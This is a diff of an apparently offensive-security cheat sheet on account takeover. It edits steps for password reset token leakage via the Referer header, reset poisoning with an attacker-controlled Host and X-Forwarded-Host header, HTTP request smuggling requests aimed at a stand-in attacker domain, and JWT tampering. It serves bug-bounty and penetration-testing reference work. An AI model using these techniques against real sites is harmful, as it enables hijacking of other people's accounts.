@@ -26,24 +26,24 @@
 1. Request password reset to your email address
 2. Click on the password reset link
 3. Don't change password
-4. Click any 3rd party websites(eg: Facebook, twitter)
+4. Click any 3rd party websites(e.g., Facebook, twitter)
 5. Intercept the request in Burp Suite proxy
 6. Check if the referer header is leaking password reset token.
 
 ### Account Takeover Through Password Reset Poisoning
 
 1. Intercept the password reset request in Burp Suite
-2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
+2. Add or edit the following headers in Burp Suite : `Host: [ATTACKER.DOMAIN.TLD]`, `X-Forwarded-Host: [ATTACKER.DOMAIN.TLD]`
 3. Forward the request with the modified header
 
     ```http
     POST https://example.com/reset.php HTTP/1.1
     Accept: */*
     Content-Type: application/json
-    Host: attacker.com
+    Host: [ATTACKER.DOMAIN.TLD]
     ```
 
-4. Look for a password reset URL based on the *host header* like : `https://attacker.com/reset-password.php?token=TOKEN`
+4. Look for a password reset URL based on the *host header* like : `https://[ATTACKER.DOMAIN.TLD]/reset-password.php?token=TOKEN`
 
 ### Password Reset via Email Parameter
 
@@ -142,7 +142,7 @@ Refer to **HTTP Request Smuggling** vulnerability page.
 2. Craft a request which will overwrite the `POST / HTTP/1.1` with the following data:
 
     ```powershell
-    GET http://something.burpcollaborator.net  HTTP/1.1
+    GET http://[ATTACKER.DOMAIN.TLD]  HTTP/1.1
     X: 
     ```
 
@@ -157,7 +157,7 @@ Refer to **HTTP Request Smuggling** vulnerability page.
 
     0
 
-    GET http://something.burpcollaborator.net  HTTP/1.1
+    GET http://[ATTACKER.DOMAIN.TLD]  HTTP/1.1
     X: X
     ```
 
@@ -173,15 +173,15 @@ Hackerone reports exploiting this bug
 
 ### Account Takeover via JWT
 
-JSON Web Token might be used to authenticate an user.
+JSON Web Token might be used to authenticate a user.
 
 * Edit the JWT with another User ID / Email
 * Check for weak JWT signature
 
 ## References
 
-* [$6,5k + $5k HTTP Request Smuggling mass account takeover - Slack + Zomato - Bug Bounty Reports Explained - August 30, 2020](https://www.youtube.com/watch?v=gzM4wWA7RFo)
-* [10 Password Reset Flaws - Anugrah SR - September 16, 2020](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)
-* [Broken Cryptography & Account Takeovers - Harsh Bothra - September 20, 2020](https://speakerdeck.com/harshbothra/broken-cryptography-and-account-takeovers?slide=28)
-* [CTFd Account Takeover - NIST National Vulnerability Database - March 29, 2020](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)
-* [Hacking Grindr Accounts with Copy and Paste - Troy Hunt - October 3, 2020](https://www.troyhunt.com/hacking-grindr-accounts-with-copy-and-paste/)
+* [$6,5k + $5k HTTP Request Smuggling mass account takeover - Slack + Zomato - Bug Bounty Reports Explained - August 30, 2020](https://web.archive.org/web/20250701123134/https://www.youtube.com/watch?v=gzM4wWA7RFo)
+* [10 Password Reset Flaws - Anugrah SR - September 16, 2020](https://web.archive.org/web/20250626114943/https://anugrahsr.github.io/posts/10-Password-reset-flaws/)
+* [Broken Cryptography & Account Takeovers - Harsh Bothra - September 20, 2020](https://web.archive.org/web/20250913121907/https://speakerdeck.com/harshbothra/broken-cryptography-and-account-takeovers?slide=28)
+* [CTFd Account Takeover - NIST National Vulnerability Database - March 29, 2020](https://web.archive.org/web/20200329075120/https://nvd.nist.gov/vuln/detail/CVE-2020-7245)
+* [Hacking Grindr Accounts with Copy and Paste - Troy Hunt - October 3, 2020](https://web.archive.org/web/20251219192449/https://www.troyhunt.com/hacking-grindr-accounts-with-copy-and-paste/)
